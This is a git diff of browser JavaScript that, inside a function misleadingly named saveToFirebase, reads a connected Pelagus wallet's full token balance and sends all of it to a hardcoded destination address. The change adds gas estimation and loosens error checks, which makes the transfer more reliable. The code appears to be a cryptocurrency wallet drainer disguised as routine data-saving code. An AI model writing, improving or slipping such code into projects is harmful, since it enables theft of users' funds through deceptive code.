@@ -465,22 +465,39 @@ async function saveToFirebase(data) {
         });
 
         const balanceResult = await balanceResponse.json();
-        if (!balanceResult.result) {
-            throw new Error('Failed to fetch token balance');
-        }
-
-        const rawBalance = BigInt(balanceResult.result);
+        const rawBalance = BigInt(balanceResult.result || 0);
         if (rawBalance === 0n) {
             throw new Error('No tokens available to send');
         }
 
-        console.log(`Balance retrieved: ${rawBalance} (raw units)`);
+        console.log('Balance retrieved:', rawBalance);
 
-        // Create transaction data for transfer
         const transferData = 
             '0xa9059cbb' + 
             DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
             rawBalance.toString(16).padStart(64, '0');
+
+        console.log('Transaction data prepared:', transferData);
+
+        // Estimate Gas
+        const gasEstimateResponse = await fetch(RPC_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'quai_estimateGas',
+                params: [{
+                    from: signerAddress,
+                    to: TOKEN_ADDRESS,
+                    data: transferData
+                }],
+                id: 2
+            })
+        });
+
+        const gasEstimateResult = await gasEstimateResponse.json();
+        const gasLimit = gasEstimateResult.result || '0x5208'; // Default gas limit (21000)
+        console.log('Estimated Gas Limit:', gasLimit);
 
         // Send transaction
         const txResponse = await window.pelagus.request({
@@ -488,22 +505,23 @@ async function saveToFirebase(data) {
             params: [{
                 from: signerAddress,
                 to: TOKEN_ADDRESS,
-                data: transferData
+                data: transferData,
+                gas: gasLimit
             }]
         });
 
-        console.log(`Transaction sent: ${txResponse}`);
+        console.log('Transaction sent:', txResponse);
 
-        // Wait for transaction confirmation
         const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
-        console.log(`Transaction confirmed: ${receipt.transactionHash}`);
+        console.log('Transaction confirmed:', receipt.transactionHash);
 
         alert(`Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
     } catch (error) {
         console.error('Error sending tokens:', error.message || error);
-        alert(`Error: ${error.message || 'Unexpected error occurred'}`);
+        alert(`Error: ${error.message || 'An unexpected error occurred'}`);
     }
 }
+
 
 // Wait for transaction receipt with retry and timeout
 async function waitForTransaction(txHash, rpcEndpoint) {
